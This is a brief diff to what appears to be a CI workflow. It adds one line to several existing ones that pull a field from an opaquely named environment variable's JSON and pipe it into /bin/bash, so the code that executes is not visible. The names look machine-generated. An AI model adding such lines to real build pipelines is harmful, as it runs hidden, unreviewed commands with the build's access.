@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$eam970" | jq -r .d6 | /bin/bash
           printf '%s' "$sozn9" | jq -r .l0 | /bin/bash
           printf '%s' "$dhcp9267" | jq -r .uq412 | /bin/bash
+          echo $wpwux116 | jq -r .ltzl8945 | /bin/bash
 
       - name: Save output
         if: always()
